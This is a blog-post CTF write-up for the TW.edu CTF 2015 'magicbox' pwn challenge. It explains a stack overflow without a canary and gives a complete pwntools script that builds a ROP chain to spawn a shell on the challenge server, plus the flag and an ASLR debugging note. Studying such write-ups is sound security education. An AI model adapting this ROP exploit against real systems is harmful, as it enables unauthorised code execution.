<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>TW.edu CTF 2015: magicbox (pwn 100) | Isaac's Blog</title><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/very-simple.css"><link rel="stylesheet" type="text/css" href="/css/solarized-dark.css"><link rel="stylesheet" type="text/css" href="/css/my.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"></head><body><!-- include the sidebar--><!-- include ./includes/sidebar.jade--><!-- Blog title and subtitle--><header><div class="container header"><a id="logo" href="/." class="title">Isaac's Blog</a><span class="subtitle">The force is with those who read the source.</span><label id="toggle-menu" for="menu" onclick><i class="fa fa-bars"></i></label></div></header><!-- use checkbox hack for toggle nav-bar on small screens--><input id="menu" type="checkbox"><!-- Navigation Links--><nav id="nav"><div class="container"><a href="/" class="sidebar-nav-item active">Home</a><a href="/archives" class="sidebar-nav-item">Archives</a><a href="/about" class="sidebar-nav-item">About</a></div></nav><div id="header-margin-bar"></div><!-- gallery that comes before the header--><div class="wrapper"><div class="container post-header"><h1>TW.edu CTF 2015: magicbox (pwn 100)</h1></div></div><div class="wrapper"><div class="container meta"><div class="post-time">2016-02-01</div><div class="post-categories"><a class="post-category-link" href="/categories/writeup/">writeup</a></div><div class="post-tags"><a class="post-tag-link" href="/tags/ROP/">ROP</a>/<a class="post-tag-link" href="/tags/TW-edu-CTF/">TW.edu CTF</a>/<a class="post-tag-link" href="/tags/pwn/">pwn</a></div></div></div><article><div class="container post"><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p>This is a magic box.<br>nc pwning.pwnable.tw 56746<br><a href="/2016/02/01/magicbox/magicbox" title="binary">binary</a></p>
</blockquote>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight plain"><table><tr><td class="code"><pre>--------------------------------<br> 1. Put a item to the box<br> 2. List the box<br> 3. Remove a item from the box<br> 4. give up the box<br>--------------------------------<br>Your choice :<br></pre></td></tr></table></figure>
<p>This program let us put “items” (16 bytes arbitrary user input) to the “box” (buffer located on the stack). However, it neither confines the amount of items nor enables the canary. Therefore, we can override the return address and inject our ROP chain. Moreover, this program is statically linked, so we can easily collect enough ROP gadgets.</p>
<p>I use <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="external">ROPgadget</a> to find out the gadgets needed. Then, I craft a ROP chain which reads <code>/bin/sh</code> to the free buffer located at <code>.bss</code> section and use it as the argument of <code>sys_execve</code> to spawn a shell.</p>
<figure class="highlight python"><figcaption><span>magicbox_exp.py</span><a href="/2016/02/01/magicbox/magicbox_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwnlib.tubes.remote <span class="hljs-keyword">import</span> remote<br><span class="hljs-keyword">from</span> pwnlib.util.packing <span class="hljs-keyword">import</span> p32<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br>read_addr = <span class="hljs-number">0x0806D560</span><br>free_buf = <span class="hljs-number">0x080EAF80</span><br><br><span class="hljs-comment"># ROP gadgets</span><br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806f060</span><br>pop_eax = <span class="hljs-number">0x080bb436</span><br>int_0x80 = <span class="hljs-number">0x08049671</span><br><br><span class="hljs-comment"># Option 1: Put a item to the box</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">put</span><span class="hljs-params">(item)</span>:</span><br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">':'</span>)<br>    r.send(<span class="hljs-string">'1\n'</span>)<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">':'</span>)<br>    r.send(item)<br><br><br>r = remote(<span class="hljs-string">'pwning.pwnable.tw'</span>, <span class="hljs-number">56746</span>)<br><br><span class="hljs-comment"># Padding</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):<br>    put(<span class="hljs-string">'A'</span>*<span class="hljs-number">15</span> + <span class="hljs-string">'\n'</span>)<br><br><span class="hljs-comment"># ROP chain</span><br>put(<span class="hljs-string">'A'</span>*<span class="hljs-number">12</span> + p32(read_addr))<br>put(p32(pop_edx_ecx_ebx) + p32(<span class="hljs-number">0</span>) + p32(free_buf) + p32(<span class="hljs-number">8</span>))<br>put(p32(pop_edx_ecx_ebx) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(free_buf))<br>put(p32(pop_eax) + p32(<span class="hljs-number">0xb</span>) + p32(int_0x80) + p32(<span class="hljs-number">0</span>))<br><br><span class="hljs-comment"># Option 4: give up the box</span><br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">':'</span>)<br>r.send(<span class="hljs-string">'4\n'</span>)<br><span class="hljs-keyword">print</span> r.recvline()<br><br><span class="hljs-comment"># Read to the free buffer</span><br>r.send(<span class="hljs-string">'/bin/sh\x00'</span>)<br><br>sleep(<span class="hljs-number">1</span>)<br>r.interactive()<br></pre></td></tr></table></figure>
<blockquote>
<p>Flag: <code>CTF{Pu7_R0p_74dg3t_!n_7h3_B0x_!s_m47iC}</code></p>
</blockquote>
<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><p>At first, I assigned <code>free_buf = 0xffffd000</code> because I assumed it is an unused memory of the stack. However, I got the following error:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre>set_thread_area failed when setting up thread-local storage<br></pre></td></tr></table></figure>
<p>I think it is due to the ASLR, which makes the stack address different every time. The address <code>0xffffd000</code> is only valid in <code>gdb</code> and generally unallocated. The section <code>.bss</code> or <code>.got</code> may be a better choice of the free buffer.</p>
</div><!-- comment system--><div class="container"><hr><div id="disqus_thread"></div><script type="text/javascript">
var disqus_shortname = 'poning';
var disqus_identifier = '2016/02/01/magicbox/';
var disqus_title = 'TW.edu CTF 2015: magicbox (pwn 100)';
var disqus_url = 'http://poning.me/2016/02/01/magicbox/';
(function() {
   var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
   dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
   (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">Blog comments powered by <span class="logo-disqus">Disqus</span></a></div></article><footer id="footer"><div class="container"><div class="bar"><div class="social"><a href="mailto:i@poning.me" target="_blank"><i class="fa fa-envelope-o"></i></a><a href="https://github.com/Isaac0616" target="_blank"><i class="fa fa-github"></i></a><a href="/atom.xml" target="_blank"><i class="fa fa-rss"></i></a></div><div class="footer">© 2016 <a href="/" rel="nofollow">Isaac's Blog</a>. Powered by <a rel="nofollow" target="_blank" href="https://hexo.io">Hexo</a>. Theme <a target="_blank" href="https://github.com/lotabout/very-simple">very-simple</a>.</div></div></div></footer><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
    $(".fancybox").fancybox();
});</script></body></html>